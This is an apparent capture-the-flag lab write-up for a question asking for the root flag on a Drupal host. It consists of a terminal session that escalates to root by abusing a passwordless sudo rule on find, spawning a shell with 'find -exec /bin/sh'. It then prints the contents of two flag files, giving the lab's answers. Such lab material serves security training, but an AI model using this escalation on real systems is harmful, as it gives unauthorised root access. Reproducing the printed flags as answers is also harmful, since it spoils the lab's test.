## 34. What is the value of the flag /root/flag.txt on the host running Drupal?

I understand that I only have one attempt at this answer. After clicking _Submit answer_, I will not be able to make edits. Your answer will be graded based on the state of the lab environment at the time it is submitted.

Submit answer

Case-sensitive answer. Please enter text as displayed.




```bash
$ sudo -l
Matching Defaults entries for auditor on ip-192-168-100-52:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User auditor may run the following commands on ip-192-168-100-52:
    (root) NOPASSWD: /usr/bin/find
auditor@ip-192-168-100-52:~$ sudo -L
sudo: invalid option -- 'L'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
auditor@ip-192-168-100-52:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
# whoami
root
# ls /home
auditor  dbadmin  ubuntu
# cat /home/auditor/flag.txt
b9c3a9212f6d4452a9c5daef7795aabe
# cat /root/flag.txt
64f454a3c4a5445cb7a789a88ec04926
# 
```
